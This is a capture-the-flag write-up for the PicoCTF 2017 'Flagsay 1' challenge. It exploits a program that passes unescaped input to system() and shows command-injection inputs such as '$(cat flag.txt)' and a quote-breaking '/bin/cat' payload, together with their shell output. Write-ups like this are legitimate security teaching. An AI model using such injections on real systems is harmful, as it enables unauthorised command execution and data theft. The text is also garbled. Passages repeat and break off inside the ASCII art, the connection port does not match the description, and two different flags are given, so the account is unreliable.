# PicoCTF_2017: Flagsay 1

**Category:** Binary
**Points:** 80
**Description:**

>I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](flagsay-1.c)! Source. Connect on shell2017.picoctf.com:51865.

**Hint:**

>System will run exactly what the program gives it

## Write-up
Another simple 1, looking at the source code reveals that whatever is inputted by the user is then `echo` by system.

    char commandBase[] = "/bin/echo \"%s\"\n";

Testing the program with random input,

	However, input is unescaped, so we can pass on a shell command like

    $ nc shell2017.picoctf.com 12442
	"aaa"
	51865
    $(ls)
                   _                                        
	                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
	                 //aaa  flagsay-1
    flagsay-1_no_aslr
    flag.txt
    xinetd_wrapper.sh                              /     
	                //                                   /      
	               //                                   /       
	              //                                   /        
	             //                                   /         
	            //                                   /          
	           //___________________________________/           
	          //                                                
	         //                                                 
	    //                                                  
	   //                                                   
	  //                                                    
	 //                                                     

We can see that input gets inside of the flag.
However, input is unescaped, so we can pass on a shell command        //                                                  
       //                                                   
      //                                                    
     //

Then, we can do something like this

     $ nc shell2017.picoctf.com 12442
	aaaa"
	51865
    $(cat flag.txt)
                   _                                        
	                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
	                 //aaaa /
	sh: 4: //: Permission denied
	sh: 5: //: Permission denied
	sh: 6: //: Permission denied
	sh: 7: //: Permission denied
	sh: 8: //: Permission denied
	sh: 9: //___________________________________/: not found
	sh: 10: //: Permission denied
	sh: 11: //: Permission denied
	sh: 12: //: Permission denied
	sh: 13: //: Permission denied
	sh: 14: //: Permission denied
	sh: 15: //: Permission denied
	sh: 17: Syntax error: Unterminated quoted string

As seen above, `"` at the end of the input breaks the code. Also, we can see the shell in the second and the following lines.

Then, we can do something like this to break the first line with characters and the command for the second line, gives the flag

    $ nc shell2017.picoctf.com 12442
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"bin/cat flag.txt2ab2050bf32e84975a10d774a919e1d0                    /     
                //                                   /      
               //                                   /       
              //                                   /        
               _     //                                   
  /         
            //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
             //aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/
	6116b5c621137949e3f70fd31f7cc29a
	//bin/cat: /: Is a directory
	sh: 5: //: Permission denied
	sh: 6: //: Permission denied
	sh: 7: //: Permission denied
	sh: 8: //: Permission denied
	sh: 9: //___________________________________/: not found
	sh: 10: //: Permission denied
	sh: 11: //: Permission denied
	sh: 12: //: Permission denied
	sh: 13: //: Permission denied
	sh: 14: //: Permission denied
	sh: 15: //: Permission denied
	sh: 17: Syntax error: Unterminated quoted string

Therefore, the flag is `6116b5c621137949e3f70fd31f7cc29a                                   /          
           //___________________________________/           
          //                                                
         //                                                 
        //                                                  
       //                                                   
      //                                                    
     // 

Therefore, the flag is `2ab2050bf32e84975a10d774a919e1d0`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTM4NDU2MTYwMCw0NjUwNzcwNDNdfQ==
-->